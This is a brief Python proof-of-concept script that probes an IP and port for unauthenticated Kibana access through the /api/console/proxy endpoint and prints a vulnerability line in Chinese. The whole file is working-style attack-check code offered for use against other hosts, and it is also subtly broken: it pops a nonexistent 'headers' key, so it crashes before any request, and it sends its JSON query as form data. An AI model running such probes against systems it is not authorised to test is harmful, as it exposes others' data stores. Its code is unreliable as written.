# coding:utf-8

import requests
import sys


def get_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0 Safari/537.36',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    }

def check(ip, port):
    params = {
        "small_path": "_search",
        "method": "POST"
    }

    post_data = {
        "query": {
            "match_all": {}
        },
        "size": 0
    }
    request_args = get_headers()
    headers = request_args.pop('headers')

    try:
        if str(port) == '443' or str(port) == '8443':
            url = "https://" + str(ip) + ":" + str(port) + "/api/console/proxy"
            r = requests.post(url, params=params, data=post_data, headers=headers, timeout=1, verify=False,
                              allow_redirects=False)
        else:
            url = "http://" + str(ip) + ":" + str(port) + "/api/console/proxy"
            r = requests.post(url, params=params, data=post_data, headers=headers, timeout=1, allow_redirects=False)

        if r.status_code == 200 and 'hits' in r.json():
            row = {
                "wakaka": "ok",
                "level": "Medium",
                "vul": "kibana未授权访问，测试poc:(/api/console/proxy)"
            }
            print(row)
    except:
        pass


if __name__ == "__main__":
    if len(sys.argv) == 3:
        target = sys.argv[1]
        port = sys.argv[2]
        check(target, port)
# coding:utf-8
